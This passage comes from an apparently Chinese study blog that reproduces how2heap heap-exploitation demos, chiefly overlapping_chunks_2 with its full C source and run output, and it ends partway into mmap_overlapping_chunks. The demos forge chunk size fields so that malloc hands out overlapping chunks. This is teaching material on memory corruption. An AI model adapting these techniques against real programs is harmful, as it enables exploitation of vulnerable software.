p3, in this case p4 includes all p3.\n&quot;</span>);<br><br><br><span class="hljs-comment">// 造成堆块重叠</span><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span><br><br>		<span class="hljs-string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);<br><br>	<span class="hljs-built_in">memset</span>(p4, <span class="hljs-string">&#x27;4&#x27;</span>, evil_region_size);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);<br><br>	<span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">80</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/overlapping$ ./overlapping_chunks<br><br>This is a simple chunks overlapping problem<br><br>Let<span class="hljs-number">&#x27;</span>s start to allocate <span class="hljs-number">3</span> chunks on the heap<br>The <span class="hljs-number">3</span> chunks have been allocated here:<br>p1=<span class="hljs-number">0x24e4010</span><br>p2=<span class="hljs-number">0x24e4110</span><br>p3=<span class="hljs-number">0x24e4210</span><br><br>Now let<span class="hljs-number">&#x27;</span>s <span class="hljs-built_in">free</span> the chunk p2<br>The chunk p2 is now in the unsorted bin ready to serve possible<br>new <span class="hljs-built_in">malloc</span>() of its size<br>Now let<span class="hljs-number">&#x27;</span>s simulate an overflow that can overwrite the size of the<br>chunk freed p2.<br>For a toy program, the value of the last <span class="hljs-number">3</span> bits is unimportant; however, it is best to maintain the stability of the heap.<br>To achieve this stability we will mark the least signifigant bit as <span class="hljs-number">1</span> (prev_inuse), to assure that p1 is not mistaken <span class="hljs-keyword">for</span> a <span class="hljs-built_in">free</span> chunk.<br>We are going to <span class="hljs-built_in">set</span> the size of chunk p2 to to <span class="hljs-number">385</span>, which gives us<br>a region size of <span class="hljs-number">376</span><br><br>Now let<span class="hljs-number">&#x27;</span>s allocate another chunk with a size equal to the data<br>size of the chunk p2 injected size<br>This <span class="hljs-built_in">malloc</span> will be served from the previously freed chunk that<br>is parked in the unsorted bin which size has been modified by us<br><br>p4 has been allocated at <span class="hljs-number">0x24e4110</span> and ends at <span class="hljs-number">0x24e4288</span><br>p3 starts at <span class="hljs-number">0x24e4210</span> and ends at <span class="hljs-number">0x24e4288</span><br>p4 should overlap with p3, in this <span class="hljs-keyword">case</span> p4 includes all p3.<br><br>Now everything copied inside chunk p4 can overwrites data on<br>chunk p3, and data written to chunk p3 can overwrite data<br>stored in the p4 chunk.<br><br>Let<span class="hljs-number">&#x27;</span>s run through an example. Right now, we have:<br>p4 = x����<br>p3 = <span class="hljs-number">333333333333333333333333333333333333333333333333333333333333333333333333333</span><span class="hljs-number">33333333333333333333333333333333333333333333</span>�<br><br>If we <span class="hljs-built_in">memset</span>(p4, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-number">376</span>), we have:<br>p4 = <span class="hljs-number">444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444</span><span class="hljs-number">444444444444444444444444444444444444444444444444444444444444</span>�<br>p3 = <span class="hljs-number">444444444444444444444444444444444444444444444444444444444444444444444444444</span><span class="hljs-number">44444444444444444444444444444444444444444444</span>�<br><br>And <span class="hljs-keyword">if</span> we then <span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">80</span>), we have:<br>p4 = <span class="hljs-number">444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444433333333333333333333333333333333333333333333333333333333333</span><span class="hljs-number">333333333333333333334444444444444444444444444444444444444444</span>�<br>p3 = <span class="hljs-number">333333333333333333333333333333333333333333333333333333333333333333333333333</span><span class="hljs-number">33334444444444444444444444444444444444444444</span>�<br></code></pre></td></tr></table></figure>

<h3 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h3><p>扩展已分配的堆块主要考虑到堆块的释放，主要分为向前合并和向后合并。向前合并即是向高地址的chunk合并，主要通过<code>size</code>位来获取；向后合并即是向低地址的chunk合并，主要通过<code>prev_size</code>来获取。当我们能够控制这两个标志，就能控制合并堆块的位置。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> Yet another simple tale of overlapping chunk.</span><br><span class="hljs-comment">扩展未释放的堆块</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> This technique is taken from</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> This is also referenced as Nonadjacent Free Chunk Consolidation Attack.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br>  <br><br>  <span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;<br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;<br><br>  <span class="hljs-type">int</span> prev_in_use = <span class="hljs-number">0x1</span>;<br><br><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThis is a simple chunks overlapping problem&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nLet&#x27;s start to allocate 5 chunks on the heap:&quot;</span>);<br><br><br><br>  p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br><br><br>  real_size_p1 = malloc_usable_size(p1);<br><br>  real_size_p2 = malloc_usable_size(p2);<br><br>  real_size_p3 = malloc_usable_size(p3);<br><br>  real_size_p4 = malloc_usable_size(p4);<br><br>  real_size_p5 = malloc_usable_size(p5);<br><br><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n\nchunk p1 from %p to %p&quot;</span>, p1, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p1+malloc_usable_size(p1));<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p2 from %p to %p&quot;</span>, p2,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p2+malloc_usable_size(p2));<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p3 from %p to %p&quot;</span>, p3,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p3+malloc_usable_size(p3));<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p4 from %p to %p&quot;</span>, p4, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p4+malloc_usable_size(p4));<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p5 from %p to %p\n&quot;</span>, p5,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p5+malloc_usable_size(p5));<br><br><br><br>  <span class="hljs-built_in">memset</span>(p1,<span class="hljs-string">&#x27;A&#x27;</span>,real_size_p1);<br><br>  <span class="hljs-built_in">memset</span>(p2,<span class="hljs-string">&#x27;B&#x27;</span>,real_size_p2);<br><br>  <span class="hljs-built_in">memset</span>(p3,<span class="hljs-string">&#x27;C&#x27;</span>,real_size_p3);<br><br>  <span class="hljs-built_in">memset</span>(p4,<span class="hljs-string">&#x27;D&#x27;</span>,real_size_p4);<br><br>  <span class="hljs-built_in">memset</span>(p5,<span class="hljs-string">&#x27;E&#x27;</span>,real_size_p5);<br><br>  <br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nLet&#x27;s free the chunk p4.\nIn this case this isn&#x27;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;</span>); <br><br>  <br><br>  <span class="hljs-built_in">free</span>(p4);<br><br><br><span class="hljs-comment">// 覆盖堆块p2的size位为堆块p2和p3大小的和</span><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nLet&#x27;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;</span>);<br><br><br><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>; <span class="hljs-comment">//&lt;--- BUG HERE </span><br><br><br><span class="hljs-comment">// 这样释放的时候就会越过堆块p3</span><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;</span>);<br><br>  <span class="hljs-built_in">free</span>(p2);<br><br>  <br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;</span>);<br><br><br><br>  p6 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">2000</span>);<br><br>  real_size_p6 = malloc_usable_size(p6);<br><br><br><span class="hljs-comment">// 现在p3和p6产生了堆块重叠</span><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p6 from %p to %p&quot;</span>, p6,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p6+real_size_p6);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p3 from %p to %p\n&quot;</span>, p3, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) p3+real_size_p3); <br><br><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nData inside chunk p3: \n\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>,(<span class="hljs-type">char</span> *)p3); <br><br><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nLet&#x27;s write something inside p6\n&quot;</span>);<br><br>  <span class="hljs-built_in">memset</span>(p6,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-number">1500</span>);  <br><br>  <br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nData inside chunk p3: \n\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>,(<span class="hljs-type">char</span> *)p3); <br><br><br><br><br><br>&#125;<br><br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/overlapping$ ./overlapping_chunks_2<br><br>This is a simple chunks overlapping problem<br>This is also referenced as Nonadjacent Free Chunk Consolidation Attack<br><br>Let<span class="hljs-number">&#x27;</span>s start to allocate <span class="hljs-number">5</span> chunks on the heap:<br><br>chunk p1 from <span class="hljs-number">0x956010</span> to <span class="hljs-number">0x9563f8</span><br>chunk p2 from <span class="hljs-number">0x956400</span> to <span class="hljs-number">0x9567e8</span><br>chunk p3 from <span class="hljs-number">0x9567f0</span> to <span class="hljs-number">0x956bd8</span><br>chunk p4 from <span class="hljs-number">0x956be0</span> to <span class="hljs-number">0x956fc8</span><br>chunk p5 from <span class="hljs-number">0x956fd0</span> to <span class="hljs-number">0x9573b8</span><br><br>Let<span class="hljs-number">&#x27;</span>s <span class="hljs-built_in">free</span> the chunk p4.<br>In this <span class="hljs-keyword">case</span> this isn<span class="hljs-number">&#x27;</span>t coealesced with top chunk since we have p5 bordering top chunk after p4<br><br>Let<span class="hljs-number">&#x27;</span>s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2<br>with the size of chunk_p2 + size of chunk_p3<br><br>Now during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span> operation on p2, the allocator is fooled to think that <br>the nextchunk is <span class="hljs-title function_">p4</span> <span class="hljs-params">( since p2 + size_p2 now point to p4 )</span> <br><br>This operation will basically create a big <span class="hljs-built_in">free</span> chunk that wrongly includes p3<br><br>Now let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk<br><br>Our <span class="hljs-title function_">malloc</span><span class="hljs-params">()</span> has been satisfied by our crafted big <span class="hljs-built_in">free</span> chunk, now p6 and p3 are overlapping and <br>we can overwrite data in p3 by writing on chunk p6<br><br>chunk p6 from 0x956400 to 0x956bd8<br>chunk p3 from 0x9567f0 to 0x956bd8<br><br>Data inside chunk p3: <br><br>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�<br><br>Let&#x27;s write something inside p6<br><br>Data inside chunk p3: <br><br>FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�<br></code></pre></td></tr></table></figure>

<h3 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span 